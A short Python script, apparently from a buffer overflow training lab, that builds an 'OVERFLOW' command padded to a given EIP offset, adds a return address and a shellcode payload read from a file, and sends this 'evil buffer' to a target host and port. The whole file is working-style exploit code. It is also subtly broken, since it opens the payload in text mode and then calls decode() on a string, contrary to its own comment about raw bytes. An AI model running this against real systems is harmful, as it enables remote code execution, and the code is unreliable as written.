#!/usr/bin/env python3

import socket
import argparse

parser = argparse.ArgumentParser(description="Exploit script")
parser.add_argument("--ip", required=True, help="Target IP address")
parser.add_argument("--port", type=int, default=1337, help="Target port (default: 1337)")
parser.add_argument("--prefix", required=True, help="Prefix before payload")
parser.add_argument("--offset", type=int, default=0, help="Offset to EIP")
parser.add_argument("--retn", default="", help="Return address (e.g., '\\xaf\\xbe\\xad\\xde')")
parser.add_argument("--padding", default="", help="Padding (default: empty)")
parser.add_argument("--payload", required=True, help="Path to payload file")

args = parser.parse_args()

ip = args.ip
port = args.port
prefix = "OVERFLOW" + args.prefix + " "
offset = args.offset
retn = args.retn
padding = args.padding

with open(args.payload, "r") as f:
    payload = f.read()  # Read payload as raw bytes

buffer = prefix + "A" * offset + retn + padding + payload.decode("latin-1")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect.")

